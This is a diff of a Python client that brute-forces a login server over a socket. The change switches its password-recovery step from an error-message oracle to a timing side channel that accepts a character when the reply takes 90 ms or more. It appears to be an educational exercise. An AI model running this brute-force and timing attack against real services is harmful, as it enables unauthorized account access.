@@ -3,6 +3,7 @@ import socket
 import itertools
 import json
 import string
+from datetime import datetime
 
 
 def deserialize_json(s_json):
@@ -42,6 +43,7 @@ def main():
         address = (args.ip, args.port)
         client_socket.connect(address)
         response = ''
+
         while response != 'Connection success!':
             try:
                 while response != 'Wrong password!':
@@ -56,7 +58,8 @@ def main():
                 if response == 'Wrong password!':
                     passwords = from_dictionary()
                     s_password_res = ''
-                    while response == 'Wrong password!' or response == 'Exception happened during login':
+                    while response == 'Wrong password!' or ((time_stop - time_start).microseconds >= 90000):
+                        time_start = datetime.now()
                         passwd = next(passwords)
                         data = serialize_json(login, s_password_res + passwd)
                         data = data.encode(encoding='UTF-8')
@@ -64,13 +67,17 @@ def main():
                         response = client_socket.recv(1024)
                         response = response.decode(encoding='UTF-8')
                         response = deserialize_json(response)
-
-                        if response == 'Exception happened during login':
-                            s_password_res += passwd
-                            passwords = from_dictionary()
+                        time_stop = datetime.now()
+                        time_elapsed = time_stop - time_start
 
                         if response == 'Connection success!':
                             s_password_res += passwd
+
+                        elif (time_stop - time_start).microseconds >= 90000:
+                            s_password_res += passwd
+                            passwords = from_dictionary()
+
+
 
             except:
                 break
